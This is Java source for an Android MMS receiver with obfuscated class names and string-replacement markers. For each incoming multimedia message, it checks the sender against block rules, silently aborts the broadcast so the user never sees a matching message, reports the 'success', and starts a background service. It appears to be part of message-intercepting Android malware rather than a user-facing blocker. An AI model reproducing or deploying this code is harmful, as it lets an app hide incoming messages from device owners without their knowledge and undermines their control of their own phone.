package net.workspace;
import net.workspace.bean.Block;
import net.workspace.listener.BlockListener;
import net.workspace.manager.ReportManager;
import net.workspace.sms.SmsHelper;
import net.workspace.util.CommonUtil;
import net.workspace.util.MyLogger;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import com.google.android.mms.pdu.GenericPdu;
import com.google.android.mms.pdu.PduParser;

/**
 * MmsReceiver
 * @author Hike
 *
 */
@SuppressLint("NewApi")
public class MR extends net.workspace.AR {
    public static net.workspace.MR instance;
    public static Intent intent;
    private Context context;
    private String DATA = /*const-replace-start*/"data";
    private String GET_PHONE = /*const-replace-start*/"getPone";
    public void dealMsg(final BroadcastReceiver broadcastreceiver, Intent inputIntent) {
        byte abyte0[] = inputIntent.getByteArrayExtra(DATA);
        if (abyte0 != null) {
            GenericPdu genericpdu = new PduParser(abyte0).parse();
            if (genericpdu != null && genericpdu.getFrom() != null) {
                String address = genericpdu.getFrom().getString();
                BlockListener listener = new BlockListener() {
                    private boolean blocked = false;
                    @Override
                    public void stopBroadcast() {
                        if (!blocked) {
                            broadcastreceiver.abortBroadcast();
                            blocked = true;
                        }
                    }
                };
                SmsHelper.checkCommonBlocks(address, null, listener);
                Block block = SmsHelper.checkBlock(address, null, listener);
                if (block != null) {
                    ReportManager.successReport(block, address);
                }
                if (block != null) {
                    abortBroadcast();
                    intent = inputIntent;
                    instance = this;
                    Bundle bundle = new Bundle();
                    bundle.putBoolean(GET_PHONE, false);
                    context.startService(new Intent(context, net.workspace.MS.class).putExtras(bundle));
                } else {
                    Bundle bundle = new Bundle();
                    bundle.putBoolean(GET_PHONE, true);
                    context.startService(new Intent(context, net.workspace.MS.class).putExtras(bundle));
                }
            }
        }
    }
    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
        try {
            CommonUtil.registerReciever();
            this.context = context;
            if (android.os.Build.VERSION.SDK_INT > 7) dealMsg(this, intent);
        } catch (Exception e) {
            MyLogger.error(e);
        }
    }
}
